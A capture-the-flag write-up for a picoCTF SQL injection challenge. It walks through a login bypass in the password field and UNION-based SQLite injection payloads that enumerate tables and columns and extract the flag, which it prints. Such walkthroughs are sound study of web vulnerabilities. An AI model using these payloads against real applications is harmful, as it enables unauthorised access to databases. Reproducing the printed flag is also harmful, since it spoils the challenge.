# More SQLi

## Challenge Description

The flag is somewhere on this web application not necessarily on the website. Find it.
Check this out.

## Hint

SQLiLite

## Solution

I started with the classic SQL injection `' or 1=1 --` in the username field, but it didn't work. 

<img width="738" height="92" alt="image" src="https://github.com/user-attachments/assets/0f19d6b5-a296-4f8d-888e-8b034c9143c4" />

The SQL query had an unusual structure with the password checked before the username. Then I tried the same payload in the password field which was a success

<img width="985" height="774" alt="image" src="https://github.com/user-attachments/assets/cd6e2fb0-6ad0-4a60-a9b4-b725e4418b40" />

The next step was to understand the database structure. I used UNION-based SQL injection to determine the number of columns in the original query. I tried with one column first which gave no result. Two columns also showed no result and finally on trying with returned the Algiers entry, confirming the original query returns three columns

```bash
Algiers' UNION SELECT null, null, null --
```
<img width="759" height="468" alt="image" src="https://github.com/user-attachments/assets/bcf23692-35e2-455b-94f0-34dab116390a" />

Based on the challenge hint I figured the database was SQLite, which uses specific system tables and functions. So now I needed to find what tables existed

```bash
Algiers' UNION SELECT null, null, name FROM sqlite_master WHERE type='table' --
```

<img width="736" height="590" alt="image" src="https://github.com/user-attachments/assets/fb0156f3-04ee-4256-b978-412f2683fcd3" />

The `more_table` looked promising. So I looked up the columns in this table using SQLite's `PRAGMA` function

```bash
Algiers' UNION SELECT null, null, name FROM PRAGMA_table_info('more_table') --
```
<img width="748" height="523" alt="image" src="https://github.com/user-attachments/assets/b2ae320c-53d5-45ed-b882-a521700394cc" />

A column named flag! I had to check that out

```bash
Algiers' UNION SELECT null, null, flag FROM more_table --
```

<img width="838" height="645" alt="image" src="https://github.com/user-attachments/assets/e2f58a90-4688-4077-a598-170ff7bb76ed" />

Thus the flag for this challenge is `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}`

